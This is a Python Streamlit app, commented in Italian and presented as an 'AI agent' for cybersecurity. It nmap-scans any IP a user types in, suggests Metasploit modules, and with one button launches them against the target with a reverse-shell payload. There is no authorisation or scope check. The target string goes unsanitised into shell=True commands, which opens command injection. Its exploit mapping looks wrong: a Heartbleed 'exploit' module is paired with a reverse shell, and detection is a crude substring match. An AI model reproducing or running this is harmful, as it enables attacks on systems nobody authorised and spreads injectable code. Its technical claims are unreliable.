import subprocess
import streamlit as st

# Funzione per eseguire la scansione Nmap
def scan_nmap(target_ip):
    nmap_command = f"nmap -A --script vuln {target_ip}"
    result = subprocess.run(nmap_command, shell=True, capture_output=True, text=True)
    return result.stdout

# Funzione per analizzare i risultati e identificare vulnerabilità
def analyze_vulnerabilities(scan_results):
    vulnerabilities = []
    if "Heartbleed" in scan_results:
        vulnerabilities.append("Heartbleed (CVE-2014-0160)")
    if "SSL/TLS" in scan_results:
        vulnerabilities.append("SSL/TLS Vulnerability")
    return vulnerabilities

# Funzione per suggerire exploit e payload
def suggest_exploit(vulnerabilities):
    exploit_suggestions = {}
    for vuln in vulnerabilities:
        if vuln == "Heartbleed (CVE-2014-0160)":
            exploit_suggestions[vuln] = {
                "Exploit": "exploit/linux/http/openssl_heartbleed",
                "Payload": "generic/shell_reverse_tcp"
            }
        elif vuln == "SSL/TLS Vulnerability":
            exploit_suggestions[vuln] = {
                "Exploit": "auxiliary/scanner/ssl/ssl_version",
                "Payload": "N/A"
            }
    return exploit_suggestions

# Funzione per eseguire exploit con Metasploit
def run_metasploit(target_ip, exploit, payload):
    msf_command = f"""
    use {exploit}
    set RHOSTS {target_ip}
    set PAYLOAD {payload}
    exploit
    """
    result = subprocess.run(f"msfconsole -q -x \"{msf_command}\"", shell=True, capture_output=True, text=True)
    return result.stdout

# Interfaccia Streamlit
st.title("AI Agent per Cybersecurity con Metasploit")
st.write("Questo AI agent scansiona un host, trova vulnerabilità e suggerisce exploit.")

# Input per inserire l'IP del target
target_ip = st.text_input("Inserisci l'IP del target da scansionare:")

if target_ip:
    st.write(f"Eseguendo la scansione per {target_ip}...")
    
    # Esegui la scansione Nmap
    scan_results = scan_nmap(target_ip)
    st.text(scan_results)

    # Analizza le vulnerabilità
    vulnerabilities = analyze_vulnerabilities(scan_results)

    if vulnerabilities:
        st.write("⚠️ Vulnerabilità trovate:")
        for vuln in vulnerabilities:
            st.write(f"- {vuln}")

        # Suggerisci exploit
        exploit_suggestions = suggest_exploit(vulnerabilities)
        st.write("🔍 Suggerimenti di Exploit e Payload:")
        for vuln, suggestion in exploit_suggestions.items():
            st.write(f"**{vuln}:**")
            st.write(f"  - **Exploit:** {suggestion['Exploit']}")
            st.write(f"  - **Payload:** {suggestion['Payload']}")

        # Aggiunta di un pulsante per eseguire l'exploit con Metasploit
        if st.button("Esegui exploit con Metasploit"):
            for vuln, suggestion in exploit_suggestions.items():
                if suggestion['Payload'] != "N/A":
                    st.write(f"⚡ Lanciando exploit per {vuln}...")
                    msf_output = run_metasploit(target_ip, suggestion['Exploit'], suggestion['Payload'])
                    st.text(msf_output)
    else:
        st.write("✅ Nessuna vulnerabilità trovata.")
